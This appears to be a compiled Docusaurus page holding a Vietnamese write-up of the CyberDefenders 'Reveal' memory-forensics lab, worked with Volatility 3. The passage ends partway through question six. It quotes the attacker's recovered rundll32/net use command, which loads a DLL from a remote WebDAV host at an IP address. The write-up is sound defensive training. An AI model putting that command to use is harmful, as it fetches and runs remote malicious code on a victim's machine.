"use strict";(self.webpackChunklittle_docusaur=self.webpackChunklittle_docusaur||[]).push([[958],{6159:(n,t,i)=>{i.r(t),i.d(t,{assets:()=>s,contentTitle:()=>r,default:()=>g,frontMatter:()=>l,metadata:()=>h,toc:()=>d});const h=JSON.parse('{"id":"cyberdefenders-training/Reveal-lab","title":"Reveal Lab","description":"Hello m\u1ecdi ng\u01b0\u1eddi, c\xf9ng t\xf4i v\xe0 c\u1eadu \u1ea5y gi\u1ea3i b\xe0i t\u1eadp CTF nh\xe93","source":"@site/docs/cyberdefenders-training/Reveal-lab.md","sourceDirName":"cyberdefenders-training","slug":"/cyberdefenders-training/Reveal-lab","permalink":"/little-docusaur/docs/cyberdefenders-training/Reveal-lab","draft":false,"unlisted":false,"editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/cyberdefenders-training/Reveal-lab.md","tags":[],"version":"current","sidebarPosition":2,"frontMatter":{"title":"Reveal Lab","sidebar_position":2},"sidebar":"tutorialSidebar","previous":{"title":"CyberDefenders Training","permalink":"/little-docusaur/docs/category/cyberdefenders-training"},"next":{"title":"Set up Kali virtual machine for labs","permalink":"/little-docusaur/docs/cyberdefenders-training/setting-lab"}}');var c=i(4848),e=i(8453);const l={title:"Reveal Lab",sidebar_position:2},r=void 0,s={},d=[{value:"Ng\u1eef c\u1ea3nh",id:"ng\u1eef-c\u1ea3nh",level:2},{value:"C\xf4ng c\u1ee5 s\u1eed d\u1ee5ng",id:"c\xf4ng-c\u1ee5-s\u1eed-d\u1ee5ng",level:2},{value:"C\xe1ch Volatility 3 x\u1eed l\xfd b\u1ed9 nh\u1edb",id:"c\xe1ch-volatility-3-x\u1eed-l\xfd-b\u1ed9-nh\u1edb",level:3},{value:"C\xe1ch Volatility 3 s\u1eed d\u1ee5ng Plugins \u0111\u1ec3 ph\xe2n t\xe1ch d\u1eef li\u1ec7u",id:"c\xe1ch-volatility-3-s\u1eed-d\u1ee5ng-plugins-\u0111\u1ec3-ph\xe2n-t\xe1ch-d\u1eef-li\u1ec7u",level:3},{value:"Cheatsheet c\xf3 th\u1ec3 gi\xfap b\u1ea1n Volatility 3:",id:"cheatsheet-c\xf3-th\u1ec3-gi\xfap-b\u1ea1n-volatility-3",level:3},{value:"Qu\xe1 tr\xecnh ph\xe2n t\xedch",id:"qu\xe1-tr\xecnh-ph\xe2n-t\xedch",level:2},{value:"C\xe2u 1: X\xe1c \u0111\u1ecbnh t\xean c\u1ee7a ti\u1ebfn tr\xecnh \u0111\u1ed9c h\u1ea1i gi\xfap hi\u1ec3u b\u1ea3n ch\u1ea5t c\u1ee7a cu\u1ed9c t\u1ea5n c\xf4ng. T\xean c\u1ee7a ti\u1ebfn tr\xecnh \u0111\u1ed9c h\u1ea1i l\xe0 g\xec?",id:"c\xe2u-1-x\xe1c-\u0111\u1ecbnh-t\xean-c\u1ee7a-ti\u1ebfn-tr\xecnh-\u0111\u1ed9c-h\u1ea1i-gi\xfap-hi\u1ec3u-b\u1ea3n-ch\u1ea5t-c\u1ee7a-cu\u1ed9c-t\u1ea5n-c\xf4ng-t\xean-c\u1ee7a-ti\u1ebfn-tr\xecnh-\u0111\u1ed9c-h\u1ea1i-l\xe0-g\xec",level:3},{value:"C\xe2u 2: Bi\u1ebft ID ti\u1ebfn tr\xecnh cha (PPID) c\u1ee7a ti\u1ebfn tr\xecnh \u0111\u1ed9c h\u1ea1i h\u1ed7 tr\u1ee3 theo d\xf5i, ph\xe2n c\u1ea5p ti\u1ebfn tr\xecnh v\xe0 hi\u1ec3u \u0111\u01b0\u1ee3c lu\u1ed3ng t\u1ea5n c\xf4ng. PID cha c\u1ee7a ti\u1ebfn tr\xecnh \u0111\u1ed9c h\u1ea1i l\xe0 g\xec?",id:"c\xe2u-2-bi\u1ebft-id-ti\u1ebfn-tr\xecnh-cha-ppid-c\u1ee7a-ti\u1ebfn-tr\xecnh-\u0111\u1ed9c-h\u1ea1i-h\u1ed7-tr\u1ee3-theo-d\xf5i-ph\xe2n-c\u1ea5p-ti\u1ebfn-tr\xecnh-v\xe0-hi\u1ec3u-\u0111\u01b0\u1ee3c-lu\u1ed3ng-t\u1ea5n-c\xf4ng-pid-cha-c\u1ee7a-ti\u1ebfn-tr\xecnh-\u0111\u1ed9c-h\u1ea1i-l\xe0-g\xec",level:3},{value:"\ud83d\udd0d Q3: T\u1ec7p tin n\xe0o \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng \u0111\u1ec3 th\u1ef1c thi payload giai \u0111o\u1ea1n hai?",id:"-q3-t\u1ec7p-tin-n\xe0o-\u0111\u01b0\u1ee3c-s\u1eed-d\u1ee5ng-\u0111\u1ec3-th\u1ef1c-thi-payload-giai-\u0111o\u1ea1n-hai",level:3},{value:"\ud83d\udd0d Q4: T\xean th\u01b0 m\u1ee5c chia s\u1ebb \u0111\u01b0\u1ee3c truy c\u1eadp tr\xean m\xe1y ch\u1ee7 t\u1eeb xa?",id:"-q4-t\xean-th\u01b0-m\u1ee5c-chia-s\u1ebb-\u0111\u01b0\u1ee3c-truy-c\u1eadp-tr\xean-m\xe1y-ch\u1ee7-t\u1eeb-xa",level:3},{value:"\ud83d\udd0d Q5: M\xe3 k\u1ef9 thu\u1eadt MITRE ATT&amp;CK li\xean quan \u0111\u1ebfn ph\u01b0\u01a1ng th\u1ee9c th\u1ef1c thi n\xe0y?",id:"-q5-m\xe3-k\u1ef9-thu\u1eadt-mitre-attck-li\xean-quan-\u0111\u1ebfn-ph\u01b0\u01a1ng-th\u1ee9c-th\u1ef1c-thi-n\xe0y",level:3},{value:"\ud83d\udd0d Q6: T\xean ng\u01b0\u1eddi d\xf9ng m\xe0 qu\xe1 tr\xecnh \u0111\u1ed9c h\u1ea1i ch\u1ea1y d\u01b0\u1edbi quy\u1ec1n c\u1ee7a ng\u01b0\u1eddi \u0111\xf3?",id:"-q6-t\xean-ng\u01b0\u1eddi-d\xf9ng-m\xe0-qu\xe1-tr\xecnh-\u0111\u1ed9c-h\u1ea1i-ch\u1ea1y-d\u01b0\u1edbi-quy\u1ec1n-c\u1ee7a-ng\u01b0\u1eddi-\u0111\xf3",level:3},{value:"\ud83d\udd0d Q7: T\xean c\u1ee7a malware family?",id:"-q7-t\xean-c\u1ee7a-malware-family",level:3}];function a(n){const t={a:"a",code:"code",h2:"h2",h3:"h3",hr:"hr",img:"img",li:"li",p:"p",strong:"strong",table:"table",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,e.R)(),...n.components};return(0,c.jsxs)(c.Fragment,{children:[(0,c.jsxs)(t.p,{children:["Hello m\u1ecdi ng\u01b0\u1eddi, c\xf9ng t\xf4i v\xe0 c\u1eadu \u1ea5y gi\u1ea3i b\xe0i t\u1eadp CTF nh\xe9 :3. Gi\u1edbi thi\u1ec7u ch\xfat th\xec b\xe0i n\xe0y l\xe0",(0,c.jsx)(t.a,{href:"https://cyberdefenders.org/blueteam-ctf-challenges/reveal/",children:"Reveal Lab"}),", thu\u1ed9c lo\u1ea1i Endpoint Forensics, m\u1ee9c d\u1ec5. B\xe0i n\xe0y th\xec c\u0169ng c\xf3 ",(0,c.jsx)(t.a,{href:"https://cyberdefenders.org/walkthroughs/reveal/",children:"h\u01b0\u1edbng d\u1eabn ch\xednh th\u1ee9c"})," r\u1ed3i, n\xean t\xf4i v\xe0 c\u1eadu \u1ea5y s\u1ebd vi\u1ebft l\u1ea1i qu\xe1 tr\xecnh suy ngh\u0129 c\u1ee7a m\xecnh c\u0169ng nh\u01b0 nh\u1eefng th\xf4ng tin ch\xfang t\xf4i th\u1ea5y quan tr\u1ecdng. B\u1eaft \u0111\u1ea7u nh\xe9 :3"]}),"\n",(0,c.jsx)(t.h2,{id:"ng\u1eef-c\u1ea3nh",children:"Ng\u1eef c\u1ea3nh"}),"\n",(0,c.jsx)(t.p,{children:"B\u1ea1n l\xe0 m\u1ed9t forensic investigator t\u1ea1i m\u1ed9t t\u1ed5 ch\u1ee9c t\xe0i ch\xednh v\xe0 SIEM c\u1ee7a b\u1ea1n g\u1eafn flag ho\u1ea1t \u0111\u1ed9ng b\u1ea5t th\u01b0\u1eddng tr\xean m\xe1y tr\u1ea1m (workstation) c\xf3 quy\u1ec1n truy c\u1eadp v\xe0o d\u1eef li\u1ec7u t\xe0i ch\xednh nh\u1ea1y c\u1ea3m. Nghi ng\u1edd \u0111\xf3 l\xe0 m\u1ed9t h\xe0nh vi vi ph\u1ea1m, b\u1ea1n \u0111\xe3 nh\u1eadn \u0111\u01b0\u1ee3c m\u1ed9t file .dmp xu\u1ea5t t\u1eeb b\u1ed9 nh\u1edb c\u1ee7a m\xe1y b\u1ecb x\xe2m ph\u1ea1m. Nhi\u1ec7m v\u1ee5 c\u1ee7a b\u1ea1n l\xe0 ph\xe2n t\xedch b\u1ed9 nh\u1edb cho c\xe1c d\u1ea5u hi\u1ec7u x\xe2m ph\u1ea1m, theo d\xf5i ngu\u1ed3n g\u1ed1c c\u1ee7a h\xe0nh vi b\u1ea5t th\u01b0\u1eddng v\xe0 \u0111\xe1nh gi\xe1 ph\u1ea1m vi c\u1ee7a n\xf3 \u0111\u1ec3 qu\u1ea3n l\xfd s\u1ef1 c\u1ed1 m\u1ed9t c\xe1ch hi\u1ec7u qu\u1ea3."}),"\n",(0,c.jsx)(t.hr,{}),"\n",(0,c.jsx)(t.h2,{id:"c\xf4ng-c\u1ee5-s\u1eed-d\u1ee5ng",children:"C\xf4ng c\u1ee5 s\u1eed d\u1ee5ng"}),"\n",(0,c.jsx)(t.p,{children:"Volatility 3 l\xe0 m\u1ed9t framework ph\xe1p y b\u1ed9 nh\u1edb \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng r\u1ed9ng r\xe3i trong \u0111i\u1ec1u tra s\u1ed1 \u0111\u1ec3 ph\xe2n t\xedch d\u1eef li\u1ec7u t\u1eeb RAM dumps. C\xf4ng c\u1ee5 n\xe0y gi\xfap c\xe1c chuy\xean gia b\u1ea3o m\u1eadt ki\u1ec3m tra v\xe0 ph\xe1t hi\u1ec7n d\u1ea5u v\u1ebft ho\u1ea1t \u0111\u1ed9ng \u0111\xe1ng ng\u1edd tr\xean h\u1ec7 th\u1ed1ng."}),"\n",(0,c.jsx)(t.p,{children:(0,c.jsx)(t.img,{alt:"Install Volatility 3",src:i(1364).A+"",width:"762",height:"302"})}),"\n",(0,c.jsx)(t.h3,{id:"c\xe1ch-volatility-3-x\u1eed-l\xfd-b\u1ed9-nh\u1edb",children:"C\xe1ch Volatility 3 x\u1eed l\xfd b\u1ed9 nh\u1edb"}),"\n",(0,c.jsxs)(t.ul,{children:["\n",(0,c.jsxs)(t.li,{children:[(0,c.jsx)(t.strong,{children:"X\xe1c \u0111\u1ecbnh h\u1ec7 \u0111i\u1ec1u h\xe0nh:"})," Volatility 3 t\u1ef1 \u0111\u1ed9ng nh\u1eadn di\u1ec7n OS profile \u0111\u1ec3 di\u1ec5n gi\u1ea3i \u0111\xfang c\u1ea5u tr\xfac d\u1eef li\u1ec7u trong b\u1ed9 nh\u1edb."]}),"\n",(0,c.jsxs)(t.li,{children:[(0,c.jsx)(t.strong,{children:"S\u1eed d\u1ee5ng Symbol Tables:"})," Symbol tables gi\xfap ph\xe2n t\xedch ch\xednh x\xe1c layout c\u1ee7a b\u1ed9 nh\u1edb tr\xean c\xe1c phi\xean b\u1ea3n h\u1ec7 \u0111i\u1ec1u h\xe0nh kh\xe1c nhau."]}),"\n"]}),"\n",(0,c.jsx)(t.h3,{id:"c\xe1ch-volatility-3-s\u1eed-d\u1ee5ng-plugins-\u0111\u1ec3-ph\xe2n-t\xe1ch-d\u1eef-li\u1ec7u",children:"C\xe1ch Volatility 3 s\u1eed d\u1ee5ng Plugins \u0111\u1ec3 ph\xe2n t\xe1ch d\u1eef li\u1ec7u"}),"\n",(0,c.jsxs)(t.ul,{children:["\n",(0,c.jsxs)(t.li,{children:[(0,c.jsx)(t.strong,{children:"Plugin Execution:"})," M\u1ed7i plugin \u0111\u1ea3m nhi\u1ec7m m\u1ed9t t\xe1c v\u1ee5 c\u1ee5 th\u1ec3 nh\u01b0 li\u1ec7t k\xea ti\u1ebfn tr\xecnh, ki\u1ec3m tra k\u1ebft n\u1ed1i m\u1ea1ng, ho\u1eb7c ph\xe2n t\xedch DLL \u0111\xe3 t\u1ea3i."]}),"\n",(0,c.jsxs)(t.li,{children:[(0,c.jsx)(t.strong,{children:"Output v\xe0 Ph\xe2n T\xedch:"})," Plugins tr\xedch xu\u1ea5t th\xf4ng tin c\xf3 gi\xe1 tr\u1ecb \u0111\u1ec3 gi\xfap \u0111i\u1ec1u tra h\xe0nh vi h\u1ec7 th\u1ed1ng v\xe0 ph\xe1t hi\u1ec7n m\xe3 \u0111\u1ed9c."]}),"\n"]}),"\n",(0,c.jsx)(t.h3,{id:"cheatsheet-c\xf3-th\u1ec3-gi\xfap-b\u1ea1n-volatility-3",children:"Cheatsheet c\xf3 th\u1ec3 gi\xfap b\u1ea1n Volatility 3:"}),"\n",(0,c.jsxs)(t.ul,{children:["\n",(0,c.jsx)(t.li,{children:(0,c.jsx)(t.a,{href:"https://blog.onfvp.com/post/volatility-cheatsheet/",children:"Ashley Pearson Cheatsheet"})}),"\n",(0,c.jsx)(t.li,{children:(0,c.jsx)(t.a,{href:"https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/memory-dump-analysis/volatility-cheatsheet",children:"Hacktricks Cheatsheet"})}),"\n"]}),"\n",(0,c.jsx)(t.hr,{}),"\n",(0,c.jsx)(t.h2,{id:"qu\xe1-tr\xecnh-ph\xe2n-t\xedch",children:"Qu\xe1 tr\xecnh ph\xe2n t\xedch"}),"\n",(0,c.jsx)(t.p,{children:"L\xe0 m\u1ed9t ng\u01b0\u1eddi \u0111i\u1ec1u tra, b\u1ea1n ph\u1ea3i t\u1ef1 h\u1ecfi m\xecnh ba c\xe2u h\u1ecfi ch\xednh:"}),"\n",(0,c.jsxs)(t.ul,{children:["\n",(0,c.jsxs)(t.li,{children:[(0,c.jsx)(t.strong,{children:"What"})," - B\u1ea1n \u0111ang t\xecm ki\u1ebfm \u0111i\u1ec1u g\xec? (v\xed d\u1ee5: m\u1ed9t lo\u1ea1i t\u1ec7p c\u1ee5 th\u1ec3, t\xean ng\u01b0\u1eddi d\xf9ng, ...)"]}),"\n",(0,c.jsxs)(t.li,{children:[(0,c.jsx)(t.strong,{children:"Where"})," - B\u1ea1n s\u1ebd t\xecm th\u1ea5y b\u1eb1ng ch\u1ee9ng t\u1ea5n c\xf4ng \u1edf \u0111\xe2u? (v\xed d\u1ee5: b\u1ed9 nh\u1edb, d\u1ef1a tr\xean m\xe1y ch\u1ee7, m\u1ea1ng, ...)"]}),"\n",(0,c.jsxs)(t.li,{children:[(0,c.jsx)(t.strong,{children:"How"})," - B\u1ea1n c\xf3 th\u1ec3 l\xe0m th\u1ebf n\xe0o \u0111\u1ec3 thao t\xe1c d\u1eef li\u1ec7u v\xe0 xem n\xf3?"]}),"\n"]}),"\n",(0,c.jsx)(t.h3,{id:"c\xe2u-1-x\xe1c-\u0111\u1ecbnh-t\xean-c\u1ee7a-ti\u1ebfn-tr\xecnh-\u0111\u1ed9c-h\u1ea1i-gi\xfap-hi\u1ec3u-b\u1ea3n-ch\u1ea5t-c\u1ee7a-cu\u1ed9c-t\u1ea5n-c\xf4ng-t\xean-c\u1ee7a-ti\u1ebfn-tr\xecnh-\u0111\u1ed9c-h\u1ea1i-l\xe0-g\xec",children:"C\xe2u 1: X\xe1c \u0111\u1ecbnh t\xean c\u1ee7a ti\u1ebfn tr\xecnh \u0111\u1ed9c h\u1ea1i gi\xfap hi\u1ec3u b\u1ea3n ch\u1ea5t c\u1ee7a cu\u1ed9c t\u1ea5n c\xf4ng. T\xean c\u1ee7a ti\u1ebfn tr\xecnh \u0111\u1ed9c h\u1ea1i l\xe0 g\xec?"}),"\n",(0,c.jsx)(t.table,{children:(0,c.jsx)(t.thead,{children:(0,c.jsxs)(t.tr,{children:[(0,c.jsx)(t.th,{children:"Tr\u1ea3 l\u1eddi"}),(0,c.jsx)(t.th,{children:"powershell.exe"})]})})}),"\n",(0,c.jsxs)(t.p,{children:["Th\xfa th\u1eadt v\u1edbi m\u1ecdi ng\u01b0\u1eddi th\xec \u0111\xe2y l\xe0 l\u1ea7n \u0111\u1ea7u t\xf4i v\xe0 \u0111\u1ee5ng t\u1edbi file .dmp n\xe0y v\xe0 c\xf4ng c\u1ee5 Volatility 3 lun \xe1 ",":v"," Tr\u01b0\u1edbc gi\u1edd c\xf3 nghe nh\u1eafc \u0111\u1ebfn nh\u01b0ng ch\u01b0a c\xf3 c\u01a1 h\u1ed9i tr\u1ea3i nghi\u1ec7m."]}),"\n",(0,c.jsx)(t.p,{children:"C\u1ee9 b\u1eaft tay v\xe0o l\xe0m tr\u01b0\u1edbc \u0111\xe3, theo nh\u01b0 h\u01b0\u1edbng d\u1eabn \u1edf tr\xean, t\xf4i h\u1ecfi c\u1eadu \u1ea5y 3 c\xe2u h\u1ecfi:"}),"\n",(0,c.jsxs)(t.ul,{children:["\n",(0,c.jsxs)(t.li,{children:[(0,c.jsx)(t.strong,{children:"T\xecm c\xe1i g\xec:"})," qu\xe1 tr\xecnh \u0111\u1ed9c h\u1ea1i - malicious process."]}),"\n",(0,c.jsxs)(t.li,{children:[(0,c.jsx)(t.strong,{children:"T\xecm \u1edf \u0111\xe2u:"})," Trong file .dmp \u0111\u01b0\u1ee3c cung c\u1ea5p, ch\u1eafc ch\u1eafn r\u1ed3i ",":v"]}),"\n",(0,c.jsxs)(t.li,{children:[(0,c.jsx)(t.strong,{children:"L\xe0m th\u1ebf n\xe0o:"})," Tr\u01b0\u1edbc ti\xean ph\u1ea3i x\xe1c \u0111\u1ecbnh \u0111\u01b0\u1ee3c ti\u1ebfn tr\xecnh th\u1ebf n\xe0o l\xe0 \u0111\u1ed9c h\u1ea1i v\xe0 b\xecnh th\u01b0\u1eddng \u0111\xe3, theo g\u1ee3i \xfd th\xec t\xf4i c\xf3 th\u1ec3 search \u1edf trang ",(0,c.jsx)(t.a,{href:"https://sansorg.egnyte.com/dl/WFdH1hHnQI",children:"SANS"}),", \u0111\xe2y l\xe0 trang t\u1ed5ng h\u1ee3p \u0111\u1eb7c \u0111i\u1ec3m nh\u1eadn d\u1ea1ng c\u1ee7a c\xe1c ti\u1ebfn tr\xecnh \u0111\u1ed9c h\u1ea1i. D\xf2 th\u1ee7 c\xf4ng th\xec kh\xf3 ph\xe1t hi\u1ec7n v\xe0 t\u1ed1n th\u1eddi gian, t\xf4i c\u1ea7n \u01b0u ti\xean t\u1ed1c \u0111\u1ed9 n\xean s\u1ebd d\xf9ng Volatility3, c\xe2u l\u1ec7nh s\u1ebd l\xe0:"]}),"\n"]}),"\n",(0,c.jsx)(t.p,{children:(0,c.jsx)(t.code,{children:"vol -f /home/vita/Downloads/192-Reveal.dmp windows.malfind"})}),"\n",(0,c.jsxs)(t.p,{children:["Sau khi ch\u1ea1y c\xe2u l\u1ec7nh th\xec c\xf3 v\xe0i k\u1ebft qu\u1ea3 nh\u01b0 RuntimeBroker, thunderbird v\xe0 powershell. Th\u1eed nh\u1eadp k\u1ebft qu\u1ea3 l\u1ea7n l\u01b0\u1ee3t th\xec powershell l\xe0 \u0111\xe1p \xe1n ch\xednh x\xe1c. ",":v"," Th\u1ef1c t\u1ebf th\xec s\u1ebd ph\u1ea3i ki\u1ec3m tra m\u1ecdi k\u1ebft qu\u1ea3 nh\xe9 m\u1ecdi ng\u01b0\u1eddi.\n",(0,c.jsx)(t.img,{alt:"malfind command",src:i(8613).A+"",width:"1918",height:"772"}),"\n",(0,c.jsx)(t.img,{alt:"malfind command2",src:i(4910).A+"",width:"1917",height:"792"})]}),"\n",(0,c.jsx)(t.h3,{id:"c\xe2u-2-bi\u1ebft-id-ti\u1ebfn-tr\xecnh-cha-ppid-c\u1ee7a-ti\u1ebfn-tr\xecnh-\u0111\u1ed9c-h\u1ea1i-h\u1ed7-tr\u1ee3-theo-d\xf5i-ph\xe2n-c\u1ea5p-ti\u1ebfn-tr\xecnh-v\xe0-hi\u1ec3u-\u0111\u01b0\u1ee3c-lu\u1ed3ng-t\u1ea5n-c\xf4ng-pid-cha-c\u1ee7a-ti\u1ebfn-tr\xecnh-\u0111\u1ed9c-h\u1ea1i-l\xe0-g\xec",children:"C\xe2u 2: Bi\u1ebft ID ti\u1ebfn tr\xecnh cha (PPID) c\u1ee7a ti\u1ebfn tr\xecnh \u0111\u1ed9c h\u1ea1i h\u1ed7 tr\u1ee3 theo d\xf5i, ph\xe2n c\u1ea5p ti\u1ebfn tr\xecnh v\xe0 hi\u1ec3u \u0111\u01b0\u1ee3c lu\u1ed3ng t\u1ea5n c\xf4ng. PID cha c\u1ee7a ti\u1ebfn tr\xecnh \u0111\u1ed9c h\u1ea1i l\xe0 g\xec?"}),"\n",(0,c.jsx)(t.table,{children:(0,c.jsx)(t.thead,{children:(0,c.jsxs)(t.tr,{children:[(0,c.jsx)(t.th,{children:"Tr\u1ea3 l\u1eddi"}),(0,c.jsx)(t.th,{children:"4120"})]})})}),"\n",(0,c.jsxs)(t.ul,{children:["\n",(0,c.jsxs)(t.li,{children:[(0,c.jsx)(t.strong,{children:"T\xecm c\xe1i g\xec:"})," PID cha c\u1ee7a ti\u1ebfn tr\xecnh \u0111\u1ed9c h\u1ea1i."]}),"\n",(0,c.jsxs)(t.li,{children:[(0,c.jsx)(t.strong,{children:"T\xecm \u1edf \u0111\xe2u:"})," Trong file .dmp \u0111\u01b0\u1ee3c cung c\u1ea5p, ch\u1eafc ch\u1eafn r\u1ed3i ",":v"]}),"\n",(0,c.jsxs)(t.li,{children:[(0,c.jsx)(t.strong,{children:"L\xe0m th\u1ebf n\xe0o:"})," Volatility3 c\xf3 h\u1ed7 tr\u1ee3 x\xe1c \u0111\u1ecbnh c\xe2y ti\u1ebfn tr\xecnh n\xean t\xf4i s\u1ebd t\u1eadn d\u1ee5ng ch\u1ee9c n\u0103ng n\xe0y, v\u1edbi l\u1ea1i ti\u1ebfn tr\xecnh powershell.exe tr\xean c\xf3 PID l\xe0 3692 n\xean t\xf4i s\u1ebd l\u1ecdc ra nh\u1eefng th\xf4ng tin li\xean quan t\u1edbi PID n\xe0y th\xf4i."]}),"\n"]}),"\n",(0,c.jsx)(t.p,{children:(0,c.jsx)(t.code,{children:'vol -f /home/vita/Downloads/192-Reveal.dmp windows.pstree | grep "3692"'})}),"\n",(0,c.jsx)(t.p,{children:(0,c.jsx)(t.img,{alt:"PPID",src:i(1331).A+"",width:"1918",height:"206"})}),"\n",(0,c.jsx)(t.h3,{id:"-q3-t\u1ec7p-tin-n\xe0o-\u0111\u01b0\u1ee3c-s\u1eed-d\u1ee5ng-\u0111\u1ec3-th\u1ef1c-thi-payload-giai-\u0111o\u1ea1n-hai",children:"\ud83d\udd0d Q3: T\u1ec7p tin n\xe0o \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng \u0111\u1ec3 th\u1ef1c thi payload giai \u0111o\u1ea1n hai?"}),"\n",(0,c.jsx)(t.table,{children:(0,c.jsx)(t.thead,{children:(0,c.jsxs)(t.tr,{children:[(0,c.jsx)(t.th,{children:"Tr\u1ea3 l\u1eddi"}),(0,c.jsx)(t.th,{children:"3435.dll"})]})})}),"\n",(0,c.jsxs)(t.ul,{children:["\n",(0,c.jsxs)(t.li,{children:[(0,c.jsx)(t.strong,{children:"T\xecm c\xe1i g\xec:"})," T\xean file th\u1ef1c thi payload giai \u0111o\u1ea1n hai."]}),"\n",(0,c.jsxs)(t.li,{children:[(0,c.jsx)(t.strong,{children:"T\xecm \u1edf \u0111\xe2u:"})," L\u1ec7nh th\u1ef1c thi c\u1ee7a powershell ban \u0111\u1ea7u."]}),"\n",(0,c.jsxs)(t.li,{children:[(0,c.jsx)(t.strong,{children:"T\xecm th\u1ebf n\xe0o:"})," Th\u1eadt ra th\xec th\xf4ng tin chi ti\u1ebft c\u1ee7a ti\u1ebfn tr\xecnh c\u0169ng c\xf3 hi\u1ec3n th\u1ecb \u1edf \u0111\xe1p \xe1n c\xe2u tr\u01b0\u1edbc, nh\u01b0ng m\xe0 h\u01a1i th\u1eeba th\xf4ng tin v\xe0 kh\xf3 nh\xecn, n\xean th\xf4i ng\u01b0\u1eddi ta c\xf3 ch\u1ee9c n\u0103ng n\xe0o th\xec m\xecnh d\xf9ng \u0111\xfang ch\u1ee9c n\u0103ng \u0111\xf3 ",":v",' theo k\u1ebft qu\u1ea3 t\xecm \u0111\u01b0\u1ee3c th\xec "rundll32 \\45.9.74.32@8888\\davwwwroot\\3435.dll,entry" l\xe0 s\u1eed d\u1ee5ng rundll32.exe \u0111\u1ec3 ch\u1ea1y file 3435.dll, v\xec rundll32.exe l\xe0 m\u1ed9t ti\u1ec7n \xedch c\u1ee7a Windows n\xean c\xf3 th\u1ec3 tr\xe1nh b\u1ecb ph\xe1t hi\u1ec7n.']}),"\n"]}),"\n",(0,c.jsx)(t.p,{children:(0,c.jsx)(t.code,{children:'vol -f /home/vita/Downloads/192-Reveal.dmp windows.cmdline | grep "3692"'})}),"\n",(0,c.jsx)(t.p,{children:(0,c.jsx)(t.img,{alt:"cmd line",src:i(7420).A+"",width:"956",height:"117"})}),"\n",(0,c.jsx)(t.h3,{id:"-q4-t\xean-th\u01b0-m\u1ee5c-chia-s\u1ebb-\u0111\u01b0\u1ee3c-truy-c\u1eadp-tr\xean-m\xe1y-ch\u1ee7-t\u1eeb-xa",children:"\ud83d\udd0d Q4: T\xean th\u01b0 m\u1ee5c chia s\u1ebb \u0111\u01b0\u1ee3c truy c\u1eadp tr\xean m\xe1y ch\u1ee7 t\u1eeb xa?"}),"\n",(0,c.jsx)(t.table,{children:(0,c.jsx)(t.thead,{children:(0,c.jsxs)(t.tr,{children:[(0,c.jsx)(t.th,{children:"Tr\u1ea3 l\u1eddi"}),(0,c.jsx)(t.th,{children:"davwwwroot"})]})})}),"\n",(0,c.jsxs)(t.ul,{children:["\n",(0,c.jsxs)(t.li,{children:[(0,c.jsx)(t.strong,{children:"T\xecm c\xe1i g\xec:"})," T\xean th\u01b0 m\u1ee5c chia s\u1ebb \u0111\u01b0\u1ee3c truy c\u1eadp."]}),"\n",(0,c.jsxs)(t.li,{children:[(0,c.jsx)(t.strong,{children:"T\xecm \u1edf \u0111\xe2u:"})," t\u01b0\u01a1ng t\u1ef1 nh\u01b0 tr\xean, v\xec c\xe2u l\u1ec7nh v\u1eabn ch\u01b0a ph\xe2n t\xedch h\u1ebft."]}),"\n",(0,c.jsxs)(t.li,{children:[(0,c.jsx)(t.strong,{children:"T\xecm th\u1ebf n\xe0o:"}),' Trong c\xe2u l\u1ec7nh l\xfac n\xe3y c\xf3 ph\u1ea7n "net use \\45.9.74.32@8888\\davwwwroot" d\u1ec5 nh\u1eadn th\u1ea5y \u0111\u01b0\u1ee3c net trong network v\xe0 d\xe3y IP v\u1edbi port, n\xean c\xf3 th\u1ec3 l\u1edd m\u1edd \u0111o\xe1n \u0111\u01b0\u1ee3c \u0111\xe2y l\xe0 k\u1ebft n\u1ed1i t\u1edbi m\xe1y ch\u1ee7 c\u1ee7a attacker, v\xe0 ph\u1ea7n ph\xeda sau l\xe0 \u0111\u01b0\u1eddng d\u1eabn th\u01b0 m\u1ee5c.']}),"\n"]}),"\n",(0,c.jsx)(t.h3,{id:"-q5-m\xe3-k\u1ef9-thu\u1eadt-mitre-attck-li\xean-quan-\u0111\u1ebfn-ph\u01b0\u01a1ng-th\u1ee9c-th\u1ef1c-thi-n\xe0y",children:"\ud83d\udd0d Q5: M\xe3 k\u1ef9 thu\u1eadt MITRE ATT&CK li\xean quan \u0111\u1ebfn ph\u01b0\u01a1ng th\u1ee9c th\u1ef1c thi n\xe0y?"}),"\n",(0,c.jsx)(t.table,{children:(0,c.jsx)(t.thead,{children:(0,c.jsxs)(t.tr,{children:[(0,c.jsx)(t.th,{children:"Tr\u1ea3 l\u1eddi"}),(0,c.jsx)(t.th,{children:"T1218.011"})]})})}),"\n",(0,c.jsxs)(t.ul,{children:["\n",(0,c.jsxs)(t.li,{children:[(0,c.jsx)(t.strong,{children:"T\xecm c\xe1i g\xec:"})," M\xe3 sub-technique c\u1ee7a MITRE ATT&CK li\xean quan \u0111\u1ebfn ph\u01b0\u01a1ng th\u1ee9c th\u1ef1c thi."]}),"\n",(0,c.jsxs)(t.li,{children:[(0,c.jsx)(t.strong,{children:"T\xecm \u1edf \u0111\xe2u:"})," d\u1ef1a t\xean c\xe1ch rundll32.exe \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng \u0111\u1ec3 th\u1ef1c thi DLL t\u1eeb xa v\xe0"]}),"\n",(0,c.jsxs)(t.li,{children:[(0,c.jsx)(t.strong,{children:"T\xecm th\u1ebf n\xe0o:"})," truy c\u1eadp v\xe0o trang ",(0,c.jsx)(t.a,{href:"https://attack.mitre.org/techniques/T1218/011/",children:"attack.mitre.org"})," \u0111\u1ec3 t\xecm, t\u1eeb kh\xf3a l\xe0 rundll32.exe."]}),"\n"]}),"\n",(0,c.jsx)(t.h3,{id:"-q6-t\xean-ng\u01b0\u1eddi-d\xf9ng-m\xe0-qu\xe1-tr\xecnh-\u0111\u1ed9c-h\u1ea1i-ch\u1ea1y-d\u01b0\u1edbi-quy\u1ec1n-c\u1ee7a-ng\u01b0\u1eddi-\u0111\xf3",children:"\ud83d\udd0d Q6: T\xean ng\u01b0\u1eddi d\xf9ng m\xe0 qu\xe1 tr\xecnh \u0111\u1ed9c h\u1ea1i ch\u1ea1y d\u01b0\u1edbi quy\u1ec1n c\u1ee7a ng\u01b0\u1eddi 